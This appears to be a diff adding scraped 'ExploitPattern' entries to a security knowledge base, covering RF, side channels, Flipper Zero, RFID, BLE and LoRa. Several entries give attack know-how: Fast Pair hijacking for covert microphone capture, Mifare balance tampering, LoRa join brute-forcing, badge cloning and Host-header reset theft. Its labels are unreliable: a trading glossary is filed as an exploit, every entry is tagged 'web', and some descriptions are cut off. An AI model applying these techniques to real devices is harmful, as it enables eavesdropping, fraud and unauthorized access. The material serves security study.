+      "Even if a signal is using Manchester codification (it's impossible to find more than two 0s or 1s in a row), you might **find several 1s or 0s together in the preamble**!",
+      "Detecting AM: If in the IQ graph appears for example 2 circles (probably one in 0 and other in a different amplitude), it could means that this is an AM signal. This is because in the IQ graph the distance between the 0 and the circle is the amplitude of the signal, so it's easy to visualize different amplitudes being used.",
+      "Detecting PM: Like in the previous image, if you find small circles not related between them it probably means that a phase modulation is used. This is because in the IQ graph, the angle between the point and the 0,0 is the phase of the signal, so that means that 4 different phases are used.",
+      "Note that if the information is hidden in the fact that a phase is changed and not in the phase itself, you won't see different phases clearly differentiated.",
+      "Detecting FM: IQ doesn't have a field to identify frequencies (distance to centre is amplitude and angle is phase).\\",
+      "Sync to selection intervals means that if you previously selected intervals to find the symbol rate, that symbol rate will be used.",
+      "Manual means that the indicated symbol rate is going to be used",
+      "In **Fixed interval selection** you indicate the number of intervals that should be selected and it calculates the symbol rate from it",
+      "Gadner clock recovery is usually the best option, but you still need to indicate some approximate symbol rate."
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-711",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Side Channel Analysis Attacks",
+    "description": "Side-channel attacks recover secrets by observing physical or micro-architectural \"leakage\" that is *correlated* with internal state but is *not* part of the logical interface of the device.  Examples range from measuring the instantaneous current drawn by a smart-card to abusing CPU power-management effects over a network. | Channel | Typical Target | Instrumentation | |---------|---------------|-----------------| | Power consumption | Smart-cards, IoT MCUs, FPGAs | Oscilloscope + shunt resistor/HS probe (e.g. CW503)",
+    "techniques": [
+      "Hertzbleed (2022) – DVFS frequency scaling correlates with Hamming weight, allowing *remote* extraction of EdDSA keys.",
+      "Downfall / Gather Data Sampling (Intel, 2023) – transient-execution to read AVX-gather data across SMT threads.",
+      "Zenbleed (AMD, 2023) & Inception (AMD, 2023) – speculative vector mis-prediction leaks registers cross-domain.",
+      "2024 \"​iLeakKeys\" showed 95 % accuracy recovering laptop keystrokes from a **smart-phone microphone over Zoom** using a CNN classifier.",
+      "High-speed photodiodes capture DDR4 activity LED and reconstruct AES round keys within 1 k traces with proper sampling/filters.",
+      "Constant-time implementations & memory-hard algorithms.",
+      "Masking/shuffling – split secrets into random shares; first-order resistance certified by TVLA.",
+      "Hiding – on-chip voltage regulators, randomised clock, dual-rail logic, EM shields.",
+      "Fault detection – redundant computation, threshold signatures.",
+      "Operational – disable DVFS/turbo in crypto kernels, isolate SMT, prohibit co-location in multi-tenant clouds.",
+      "ChipWhisperer-Husky (2024) – 500 MS/s scope + Cortex-M trigger; Python API as above.",
+      "Riscure Inspector & FI – commercial, supports automated leakage assessment (TVLA-2.0).",
+      "scaaml – TensorFlow-based deep-learning SCA library (v1.2 – 2025).",
+      "pyecsca – ANSSI open-source ECC SCA framework.",
+      "from chipwhisperer.capture.api.programmers import STMLink",
+      "from chipwhisperer.capture import CWSession",
+      "cw = CWSession(project='aes')",
+      "trig = cw.scope.trig",
+      "cw.connect(cw.capture.scopes[0])",
+      "cw.capture.init()"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-712",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "SPI",
+    "description": "SPI (Serial Peripheral Interface) is an Synchronous Serial Communication Protocol used in embedded systems for short distance communication between ICs (Integrated Circuits). SPI Communication Protocol makes use of the master-slave architecture which is orchastrated by the Clock and Chip Select Signal. A master-slave architecture consists of a master (usually a microprocessor) that manages external peripherals like EEPROM, sensors, control devices, etc. which are considered to be the slaves. Multiple slaves can be connected to a master but slaves can't communicate with each other. Slaves are administrated by two pins, clock and chip select. As SPI is an synchronous communication protocol, the input and output pins follow the clock signals. The chip select is used by the master to select a ",
+    "techniques": [
+      "binwalk -e",
+      "flashrom -VV -c \"W25Q64.V\" -p buspirate_spi:dev=COM3 -r flash_content.img"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-713",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "UART",
+    "description": "UART is a serial protocol, which means it transfers data between components one bit at a time. In contrast, parallel communication protocols transmit data simultaneously through multiple channels. Common serial protocols include RS-232, I2C, SPI, CAN, Ethernet, HDMI, PCI Express, and USB. Generally, the line is held high (at a logical 1 value) while UART is in the idle state. Then, to signal the start of a data transfer, the transmitter sends a start bit to the receiver, during which the signal is held low (at a logical 0 value). Next, the transmitter sends five to eight data bits containing the actual message, followed by an optional parity bit and one or two stop bits (with a logical 1 value), depending on the configuration. The parity bit, used for error checking, is rarely seen in prac",
+    "techniques": [
+      "USB-to-serial adapter",
+      "Adapters with the CP2102 or PL2303 chips",
+      "Multipurpose tool such as: Bus Pirate, the Adafruit FT232H, the Shikra, or the Attify Badge",
+      "To identify the **GND** pin use the **Continuity Test** mode, place the back lead into ground and test with the red one until you hear a sound from the multimeter. Several GND pins can be found the PCB, so you might have found or not the one belonging to UART.",
+      "To identify the **VCC port**, set the **DC voltage mode** and set it up to 20 V of voltage. Black probe on ground and red probe on the pin. Power on the device. If the multimeter measures a constant voltage of either 3.3 V or 5 V, you’ve found the Vcc pin. If you get other voltages, retry with other ports.",
+      "To identify the **TX** **port**, **DC voltage mode** up to 20 V of voltage, black probe on ground, and red probe on the pin, and power on the device. If you find the voltage fluctuates for a few seconds and then stabilizes at the Vcc value, you’ve most likely found the TX port. This is because when powering on, it sends some debug data.",
+      "The **RX port** would be the closest one to the other 3, it has the lowest voltage fluctuation and lowest overall value of all the UART pins.",
+      "ls /dev/",
+      "picocom /dev/ --baud",
+      "minicom -s",
+      "UART>m",
+      "1. HiZ",
+      "2. 1-WIRE",
+      "3. UART",
+      "4. I2C",
+      "5. SPI",
+      "6. 2WIRE",
+      "7. 3WIRE",
+      "8. KEYB",
+      "9. LCD"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-714",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "The Modbus Protocol",
+    "description": "The Modbus protocol is a widely used protocol in Industrial Automation and Control Systems. Modbus allows communication between various devices such as programmable logic controllers (PLCs), sensors, actuators, and other industrial devices. Understanding the Modbus Protocol is essential since this is the single most used communication protocol in the ICS and has a lot of potential attack surface for sniffing and even injecting commands into PLCs. Here, concepts are stated point-wise providing context of the protcol and it's nature of operation. The biggest challenge in ICS system security is the cost of implementation and upgradation. These protocols and standards where designed in the early 80s and 90s which are still widely used. Since an industry has a lot of devices and connections, up",
+    "techniques": [],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "http-715",
+    "type": "ExploitPattern",
+    "category": "HTTP",
+    "title": "Interesting HTTP",
+    "description": "Referrer is the header used by browsers to indicate which was the previous page visited. If at some point inside a web page any sensitive information is located on a GET request parameters, if the page contains links to external sources or an attacker is able to make/suggest (social engineering) the user visit a URL controlled by the attacker. It could be able to exfiltrate the sensitive information inside the latest GET request. You can make the browser follow a **Referrer-policy** that could **avoid** the sensitive information to be sent to other web applications:",
+    "techniques": [
+      "Referrer-Policy: no-referrer",
+      "Referrer-Policy: no-referrer-when-downgrade",
+      "Referrer-Policy: origin",
+      "Referrer-Policy: origin-when-cross-origin",
+      "Referrer-Policy: same-origin",
+      "Referrer-Policy: strict-origin",
+      "Referrer-Policy: strict-origin-when-cross-origin",
+      "Referrer-Policy: unsafe-url"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "http"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-716",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Investment Terms",
+    "description": "This is the most basic way to do some trading. You can **indicate the amount of the asset and the price** that you want to buy or sell, and whenever that price is reached the operation is done. Usually you can also use the **current market price** in order to perform the transaction as fast as possible to the current price. **Stop Loss - Limit**: You can also indicate amount and the price of the assets to buy or sell while also indicating a lower price to buy or sell in case it's reached (to stop losses).",
+    "techniques": [
+      "Notice that a \"Long position\" means that someone if betting that a price is going to increase",
+      "While a \"short position\" means that someone if betting that a price is going to go down",
+      "Futures: When you buy or sell a futures contract, you're entering a binding agreement to buy or sell an asset at a specific price on a future date. Both the buyer and the seller are obligated to fulfill the contract at expiration (unless the contract is closed before then).",
+      "Options: With options, you have the right, but not the obligation, to buy (in the case of a call option) or sell (in the case of a put option) an asset at a specific price before or at a certain expiration date. The buyer has the option to execute, while the seller is obligated to fulfill the trade if the buyer decides to exercise the option.",
+      "Futures: Both the buyer and the seller take on unlimited risk because they are obligated to complete the contract. The risk is the difference between the agreed-upon price and the market price at the expiration date.",
+      "Options: The buyer’s risk is limited to the premium paid to purchase the option. If the market doesn't move in favor of the option holder, they can simply let the option expire. However, the seller (writer) of the option has unlimited risk if the market moves significantly against them.",
+      "Futures: There is no upfront cost beyond the margin required to hold the position, as the buyer and seller are both obligated to complete the trade.",
+      "Options: The buyer must pay an option premium upfront for the right to exercise the option. This premium is essentially the cost of the option.",
+      "Futures: The profit or loss is based on the difference between the market price at expiration and the agreed-upon price in the contract.",
+      "Options: The buyer profits when the market moves favorably beyond the strike price by more than the premium paid. The seller profits by keeping the premium if the option is not exercised."
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-717",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "More tools",
+    "description": "- [https://github.com/yarox24/attack_monitor](https://github.com/yarox24/attack_monitor) - [https://capsule8.com/blog/dont-get-kicked-out-a-tale-of-rootkits-and-other-backdoors/](https://capsule8.com/blog/dont-get-kicked-out-a-tale-of-rootkits-and-other-backdoors/) - [https://github.com/ION28/BLUESPAWN](https://github.com/ION28/BLUESPAWN) - [https://github.com/PaperMtn/lil-pwny](https://github.com/PaperMtn/lil-pwny) : Check disclosed accounts - [https://github.com/rabobank-cdc/DeTTECT](https://github.com/rabobank-cdc/DeTTECT)",
+    "techniques": [
+      "AWS and Cloud tools: [https://github.com/toniblyx/my-arsenal-of-aws-security-tools](https://github.com/toniblyx/my-arsenal-of-aws-security-tools)",
+      "IFS (Interplanetary File System) for phising: [https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/using-the-interplanetary-file-system-for-offensive-operations/](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/using-the-interplanetary-file-system-for-offensive-operations/)",
+      "IP rotation services: [https://medium.com/@lokeshdlk77/how-to-rotate-ip-address-in-brute-force-attack-e66407259212](https://medium.com/@lokeshdlk77/how-to-rotate-ip-address-in-brute-force-attack-e66407259212)",
+      "Linux rootkit: [https://github.com/aesophor/satanic-rootkit](https://github.com/aesophor/satanic-rootkit)"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "api-718",
+    "type": "ExploitPattern",
+    "category": "API",
+    "title": "Online Platforms with API",
+    "description": "You can ask if an IP is related to suspicious/malicious activities. Completely free. Check if the IP address is related to a bot that register accounts. It can also check usernames and emails. Initially free. Some free API requests free, for more you need to pay.\\ Find Malicious activities related to IPs and Domains. Free. Find related personal data to a email (profiles on other platforms), domain (basic company info ,mails and people working) and companies (get company info from mail).\\ You need to pay to access all the possibilities.\\",
+    "techniques": [],
+    "indicators": [],
+    "tags": [
+      "web",
+      "api"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-719",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Other Web Tricks",
+    "description": "Several times the back-end trust the **Host header** to perform some actions. For example, it could use its value as the **domain to send a password reset**. So when you receive an email with a link to reset your password, the domain being used is the one you put in the Host header.Then, you can request the password reset of other users and change the domain to one controlled by you to steal their password reset codes. [WriteUp](https://medium.com/nassec-cybersecurity-writeups/how-i-was-able-to-take-over-any-users-account-with-host-header-injection-546fff6d0f2).",
+    "techniques": [],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-720",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Post Exploitation",
+    "description": "- [**PEASS-ng**](https://github.com/carlospolop/PEASS-ng): These scripts, apart for looking for PE vectors, will look for sensitive information inside the filesystem. - [**LaZagne**](https://github.com/AlessandroZ/LaZagne): The **LaZagne project** is an open source application used to **retrieve lots of passwords** stored on a local computer. Each software stores its passwords using different techniques (plaintext, APIs, custom algorithms, databases, etc.). This tool has been developed for the purpose of finding these passwords for the most commonly-used software.",
+    "techniques": [],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-721",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "FISSURE - The RF Framework",
+    "description": "**Frequency Independent SDR-based Signal Understanding and Reverse Engineering** FISSURE is an open-source RF and reverse engineering framework designed for all skill levels with hooks for signal detection and classification, protocol discovery, attack execution, IQ manipulation, vulnerability analysis, automation, and AI/ML. The framework was built to promote the rapid integration of software modules, radios, protocols, signal data, scripts, flow graphs, reference material, and third-party tools. FISSURE is a workflow enabler that keeps software in one location and allows teams to effortlessly get up to speed while sharing the same proven baseline configuration for specific Linux distributions.",
+    "techniques": [
+      "Central Hub (HIPRFISR)",
+      "Target Signal Identification (TSI)",
+      "Protocol Discovery (PD)",
+      "Flow Graph & Script Executor (FGE)",
+      "USRP: X3xx, B2xx, B20xmini, USRP2, N2xx",
+      "802.11 Adapters",
+      "bladeRF, bladeRF 2.0 micro",
+      "Open Sniffer",
+      "New feature suggestions and design changes",
+      "Software tools with installation steps",
+      "New lessons or additional material for existing lessons",
+      "RF protocols of interest",
+      "More hardware and SDR types for integration",
+      "IQ analysis scripts in Python",
+      "Installation corrections and improvements",
+      "git clone https://github.com/ainfosec/FISSURE.git",
+      "cd FISSURE",
+      "git checkout  or  or",
+      "git submodule update --init",
+      "./install"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-722",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "FZ - 125kHz RFID",
+    "description": "For more info about how 125kHz tags work check: For more info about these types of tags [**read this intro**](../pentesting-rfid.md#low-frequency-rfid-tags-125khz). Tries to **read** the card info. Then it can **emulate** them. > Note that some intercoms try to protect themselves from key duplication by sending a write command prior to reading. If the write succeeds, that tag is considered fake. When Flipper emulates RFID there is no way for the reader to distinguish it from the original one, so no such problems occur.",
+    "techniques": [
+      "EM Marin"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-723",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "FZ - iButton",
+    "description": "For more info about what is an iButton check: The **blue** part of the following imageis how you would need to **put the real iButton** so the Flipper can **read it.** The **green** part is how you need to **touch the reader** with the Flipper zero to **correctly emulate an iButton**. In Read Mode Flipper is waiting for the iButton key to touch and is able to digest any of three types of keys: **Dallas, Cyfral, and Metakom**. Flipper will **figure out the type of the key itself**. The name of the key protocol will be displayed on the screen above the ID number.",
+    "techniques": [],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-724",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "FZ - Infrared",
+    "description": "For more info about how Infrared works check: Flipper uses a digital IR signal receiver TSOP, which **allows intercepting signals from IR remotes**. There are some **smartphones** like Xiaomi, which also have an IR port, but keep in mind that **most of them can only transmit** signals and are **unable to receive** them. The Flipper infrared **receiver is quite sensitive**. You can even **catch the signal** while remaining **somewhere in between** the remote and the TV. Pointing the remote directly at Flipper's IR port is unnecessary. This comes in handy when someone is switching channels while standing near the TV, and both you and Flipper are some distance away.",
+    "techniques": [],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-725",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "FZ - NFC",
+    "description": "For info about RFID and NFC check the following page: > Apart from NFC cards Flipper Zero supports **other type of High-frequency cards** such as several **Mifare** Classic and Ultralight and **NTAG**. New types of NFC cards will be added to the list of supported cards. Flipper Zero supports the following **NFC cards type A** (ISO 14443A): - **Bank cards (EMV)** — only read UID, SAK, and ATQA without saving. - **Unknown cards** — read (UID, SAK, ATQA) and emulate an UID. For **NFC cards type B, type F, and type V**, Flipper Zero is able to read an UID without saving it.",
+    "techniques": [
+      "Bank cards (EMV) — only read UID, SAK, and ATQA without saving.",
+      "Unknown cards — read (UID, SAK, ATQA) and emulate an UID.",
+      "Low-level read — reads only the UID, SAK, and ATQA. Flipper tries to guess the high-level protocol based on this data read from the card. You can't be 100% certain with this, as it is just an assumption based on certain factors.",
+      "High-level read — reads the data from the card's memory using a specific high-level protocol. That would be reading the data on a Mifare Ultralight, reading the sectors from a Mifare Classic, or reading the card's attributes from PayPass/Apple Pay."
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-726",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "FZ - Sub-GHz",
+    "description": "Flipper Zero can **receive and transmit radio frequencies in the range of 300-928 MHz** with its built-in module, which can read, save, and emulate remote controls. These controls are used for interaction with gates, barriers, radio locks, remote control switches, wireless doorbells, smart lights, and more. Flipper Zero can help you to learn if your security is compromised. Flipper Zero has a built-in sub-1 GHz module based on a [﻿](https://www.st.com/en/nfc/st25r3916.html#overview)﻿[CC1101 chip](https://www.ti.com/lit/ds/symlink/cc1101.pdf) and a radio antenna (the maximum range is 50 meters). Both the CC1101 chip and the antenna are designed to operate at frequencies in the 300-348 MHz, 387-464 MHz, and 779-928 MHz bands.",
+    "techniques": [],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-727",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "iButton",
+    "description": "iButton is a generic name for an electronic identification key packed in a **coin-shaped metal container**. It is also called **Dallas Touch** Memory or contact memory. Even though it is often wrongly referred to as a “magnetic” key, there is **nothing magnetic** in it. In fact, a full-fledged **microchip** operating on a digital protocol is hidden inside. Usually, iButton implies the physical form of the key and reader - a round coin with two contacts. For the frame surrounding it, there are lots of variations from the most common plastic holder with a hole to rings, pendants, etc.",
+    "techniques": [],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-728",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Infrared",
+    "description": "**Infrared light is invisible to humans**. IR wavelength is from **0.7 to 1000 microns**. Household remotes use an IR signal for data transmission and operate in the wavelength range of 0.75..1.4 microns. A microcontroller in the remote makes an infrared LED blink with a specific frequency, turning the digital signal into an IR signal. To receive IR signals a **photoreceiver** is used. It **converts IR light into voltage pulses**, which are already **digital signals**. Usually, there is a **dark light filter inside the receiver**, which lets **only the desired wavelength through** and cuts out noise.",
+    "techniques": [
+      "bit encoding",
+      "data structure",
+      "carrier frequency — often in range 36..38 kHz",
+      "Flipper Zero – portable transceiver with learning, replay and dictionary-bruteforce modes (see above).",
+      "Arduino / ESP32 + IR LED / TSOP38xx receiver – cheap DIY analyser/transmitter. Combine with the `Arduino-IRremote` library (v4.x supports >40 protocols).",
+      "Logic analysers (Saleae/FX2) – capture raw timings when protocol is unknown.",
+      "Smartphones with IR-blaster (e.g., Xiaomi) – quick field test but limited range.",
+      "`Arduino-IRremote` – actively-maintained C++ library:",
+      "IRscrutinizer / AnalysIR – GUI decoders that import raw captures and auto-identify protocol + generate Pronto/Arduino code.",
+      "LIRC / ir-keytable (Linux) – receive and inject IR from the command line:",
+      "Disable or cover IR receivers on devices deployed in public spaces when not required.",
+      "Enforce *pairing* or cryptographic checks between smart-TVs and remotes; isolate privileged “service” codes.",
+      "Deploy IR-cut filters or continuous-wave detectors around classified areas to break optical covert channels.",
+      "Monitor firmware integrity of cameras/IoT appliances that expose controllable IR LEDs.",
+      "EvilScreen: Smart TV hijacking via remote control mimicry (arXiv 2210.03014)",
+      "* **IRscrutinizer / AnalysIR** – GUI decoders that import raw captures and auto-identify protocol + generate Pronto/Arduino code.",
+      "* **LIRC / ir-keytable (Linux)** – receive and inject IR from the command line:"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-729",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Low-Power Wide Area Network",
+    "description": "**Low-Power Wide Area Network** (LPWAN) is a group of wireless, low-power, wide-area network technologies designed for **long-range communications** at a low bit rate. They can reach more than **six miles** and their **batteries** can last up to **20 years**. Long Range (**LoRa**) is currently the most deployed LPWAN physical layer and its open MAC-layer specification is **LoRaWAN**. * LoRa – Chirp Spread Spectrum (CSS) physical layer developed by Semtech (proprietary but documented). * LoRaWAN – Open MAC/Network layer maintained by the LoRa-Alliance. Versions 1.0.x and 1.1 are common in the field.",
+    "techniques": [
+      "LoRa – Chirp Spread Spectrum (CSS) physical layer developed by Semtech (proprietary but documented).",
+      "LoRaWAN – Open MAC/Network layer maintained by the LoRa-Alliance. Versions 1.0.x and 1.1 are common in the field.",
+      "Typical architecture: *end-device → gateway (packet-forwarder) → network-server → application-server*.",
+      "LoRaWAN Auditing Framework (LAF) – [https://github.com/IOActive/laf](https://github.com/IOActive/laf)",
+      "Trend Micro LoRaPWN overview – [https://www.hackster.io/news/trend-micro-finds-lorawan-security-lacking-develops-lorapwn-python-utility-bba60c27d57a](https://www.hackster.io/news/trend-micro-finds-lorawan-security-lacking-develops-lorapwn-python-utility-bba60c27d57a)",
+      "python3 lorattack/sniffer.py \\",
+      "--freq 868.3e6 --bw 125e3 --rate 1e6 --sf 7 --session smartcity",
+      "python3 lorapwn/bruteforce_join.py --pcap smartcity.pcap --wordlist top1m.txt"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-730",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Building a Portable HID MaxiProx 125 kHz Mobile Cloner",
+    "description": "Turn a mains-powered HID MaxiProx 5375 long-range 125 kHz reader into a field-deployable, battery-powered badge cloner that silently harvests proximity cards during physical-security assessments. The conversion covered here is based on TrustedSec’s “Let’s Clone a Cloner – Part 3: Putting It All Together” research series and combines mechanical, electrical and RF considerations so the final device can be thrown in a backpack and immediately used on site. > Manipulating mains-powered equipment and Lithium-ion power-banks can be dangerous.  Verify every connection **before** energising the circuit and keep the antennas, coax and ground planes exactly as they were in the factory design to avoid detuning the reader.",
+    "techniques": [
+      "HID MaxiProx 5375 reader (or any 12 V HID Prox® long-range reader)",
+      "ESP RFID Tool v2.2 (ESP32-based Wiegand sniffer/logger)",
+      "USB-PD (Power-Delivery) trigger module able to negotiate 12 V @ ≥3 A",
+      "100 W USB-C power-bank (outputs 12 V PD profile)",
+      "26 AWG silicone-insulated hook-up wire – red/white",
+      "Panel-mount SPST toggle switch (for beeper kill-switch)",
+      "NKK AT4072 switch-guard / accident-proof cap",
+      "Soldering iron, solder wick & desolder pump",
+      "ABS-rated hand tools: coping-saw, utility-knife, flat & half-round files",
+      "Drill bits 1/16″ (1.5 mm) and 1/8″ (3 mm)",
+      "3 M VHB double-sided tape & Zip-ties",
+      "Using a 125 kHz **Pupa** test card the portable cloner achieved consistent reads at **≈ 8 cm** in free-air – identical to mains-powered operation.",
+      "Placing the reader inside a thin-walled metal cash box (to simulate a bank lobby desk) reduced range to ≤ 2 cm, confirming that substantial metal enclosures act as effective RF shields."
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-731",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Pentesting BLE - Bluetooth Low Energy",
+    "description": "Available since the Bluetooth 4.0 specification, BLE uses only 40 channels, covering the range of 2400 to 2483.5 MHz. In contrast, traditional Bluetooth uses 79 channels in that same range. BLE devices communicate is by sending **advertising packets** (**beacons**), these packets broadcast the BLE device’s existence to other nearby devices. These beacons sometimes **send data**, too. The listening device, also called a central device, can respond to an advertising packet with a **SCAN request** sent specifically to the advertising device. The **response** to that scan uses the same structure as the **advertising** packet with additional information that couldn’t fit on the initial advertising request, such as the full device name.",
+    "techniques": [
+      "With Nordic nRF Connect for Desktop (BLE app):",
+      "Select the nRF52/nRF52840 dongle, scan and connect to the target.",
+      "Browse the GATT database, locate the target characteristic (often has a friendly name, e.g., Alert Level).",
+      "Perform a Write with the sniffed bytes (e.g., 01 to trigger, 00 to stop).",
+      "Automate on Windows with a Nordic dongle using Python + blatann:",
+      "Command write characteristic: d44bc439-abfd-45a2-b575-925416129600",
+      "Notify characteristic: d44bc439-abfd-45a2-b575-925416129601",
+      "Image data characteristic: d44bc439-abfd-45a2-b575-92541612960a",
+      "No pairing/bonding required. Any host can connect and write to the command UUID to change brightness, select images, start animations, etc.",
+      "Common ops observed: LIGHT (brightness), IMAG (select index), DELE (delete indices), SPEED, ANIM, PLAY, CHEC (query count), DATS (begin upload).",
+      "Frame = 1‑byte length, ASCII op (e.g., b\"LIGHT\"), args, pad to 16, AES‑ECB encrypt with static key from the app.",
+      "Known static key (hex): 32672f7974ad43451d9c6c894a0e8764",
+      "After an encrypted DATS handshake, raw chunks are written unencrypted to the data characteristic …960a.",
+      "Packet format: [len][seq][payload]. Empirically ~100 bytes payload per packet works reliably.",
+      "Discovery: Scan BLE advertisements for service UUID 0xFE2C (Google Fast Pair). Devices in pairing mode typically expose a pairing badge; even out of pairing mode the Fast Pair service can respond to GATT.",
+      "Non-invasive probe (signature enforcement check):",
+      "BLE → BR/EDR pivot: Send a KBP Request and parse the encrypted response to recover the target’s BR/EDR address. Use a classic bonding call (e.g., Android `createBond()`) to complete unauthorized pairing. Where supported, writing an Account Key persists the association.",
+      "Post-bond microphone abuse: After bonding, open HFP and start SCO audio to obtain a live microphone stream for listening/recording (e.g., saving M4A). This chain turns an unsigned KBP acceptance into remote audio capture without user consent.",
+      "Hunt/detect: Look for Fast Pair GATT traffic followed immediately by classic bonding attempts to the BR/EDR address returned in KBP, and for KBP writes lacking a signature. Enforcing signature validation on KBP and prompting for user-confirmed pairing breaks the chain.",
+      "Prefer Sonoff+Sniffle on Linux for robust channel hopping and connection following. Keep a spare Nordic sniffer as a backup."
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-732",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Pentesting RFID",
+    "description": "**Radio Frequency Identification (RFID)** is the most popular short-range radio solution. It's usually used to store and transmit information that identifies an entity. An RFID tag can rely on **its own power source (active)**, such as an embedded battery, or receive its power from the reading antenna using the current **induced from the received radio waves** (**passive**). EPCglobal divides RFID tags into six categories. A tag in each category has all the capabilities listed in the previous category, making it backward compatible.",
+    "techniques": [
+      "Class 0 tags are passive tags that operate in UHF bands. The vendor preprograms them at the production factory. As a result, you can’t change the information stored in their memory.",
+      "Class 1 tags can also operate in HF bands. In addition, they can be written only once after production. Many Class 1 tags can also process cyclic redundancy checks (CRCs) of the commands they receive. CRCs are a few extra bytes at the end of the commands for error detection.",
+      "Class 2 tags can be written multiple times.",
+      "Class 3 tags can contain embedded sensors that can record environmental parameters, such as the current temperature or the tag’s motion. These tags are semi-passive, because although they have an embedded power source, such as an integrated battery, they can’t initiate wireless communication with other tags or readers.",
+      "Class 4 tags can initiate communication with other tags of the same class, making them active tags.",
+      "Class 5 tags can provide power to other tags and communicate with all the previous tag classes. Class 5 tags can act as RFID readers.",
+      "Long Range — lower frequency translates to higher range. There are some EM-Marin and HID readers, which work from a distance of up to a meter. These are often used in car parking.",
+      "Primitive protocol — due to the low data transfer rate these tags can only transmit their short ID. In most cases, data is not authenticated and it's not protected in any way. As soon as the card is in the range of the reader it just starts transmitting its ID.",
+      "Low security — These cards can be easily copied, or even read from somebody else's pocket due to the protocol's primitiveness.",
+      "EM-Marin — EM4100, EM4102. The most popular protocol in CIS. Can be read from about a meter because of its simplicity and stability.",
+      "HID Prox II — low-frequency protocol introduced by HID Global. This protocol is more popular in the western countries. It is more complex and the cards and readers for this protocol are relatively expensive.",
+      "Indala — very old low-frequency protocol that was introduced by Motorola, and later acquired by HID. You are less likely to encounter it in the wild compared to the previous two because it is falling out of use.",
+      "Low range — high-frequency cards are specifically designed so that they would have to be placed close to the reader. This also helps to protect the card from unauthorized interactions. The maximum read range that we managed to achieve was about 15 cm, and that was with custom-made high-range readers.",
+      "Advanced protocols — data transfer speeds up to 424 kbps allow complex protocols with full-fledged two-way data transfer. Which in turn allows cryptography, data transfer, etc.",
+      "High security — high-frequency contactless cards are in no way inferior to smart cards. There are cards that support cryptographically strong algorithms like AES and implement asymmetrical cryptography.",
+      "Perform legitimate top-ups on the original card and take multiple dumps (before/after).",
+      "Do a diff of the two dumps to identify the changing blocks/bytes that represent the balance and any integrity fields.",
+      "Many Classic deployments either use the native \"value block\" encoding or roll their own checksums (e.g., XOR of the balance with another field and a constant). After changing the balance, recompute the integrity bytes accordingly and ensure all duplicated/complemented fields are consistent.",
+      "If the system uses native Classic value blocks, remember the format: value (4B) + ~value (4B) + value (4B) + block address + ~address. All parts must match.",
